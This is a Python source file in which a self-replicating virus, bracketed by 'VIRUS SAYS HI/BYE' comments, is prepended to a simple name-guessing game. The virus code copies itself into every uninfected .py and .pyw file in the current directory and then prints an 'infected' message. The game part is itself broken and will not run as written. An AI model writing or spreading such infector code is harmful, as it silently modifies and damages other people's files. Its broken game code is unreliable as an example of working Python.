# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
import random

print("The names contain from these two names, Mike or john")
Name = random.choice("Mike, john")
Guess = None

print("Guess the name\n")
while Guess != Name:
    Guess = int(input("The name: "))

    if Guess == Name:
        print("You`re Right!")
    elif Guess == __contains__("m", "i", "k", "e"):
        print(f"You`re getting close!")
    elif Guess == __contains__("j", "o", "h", "n"):
        print(f"You`re getting close")
    else:
        print("You`re not right but keep up the spirit")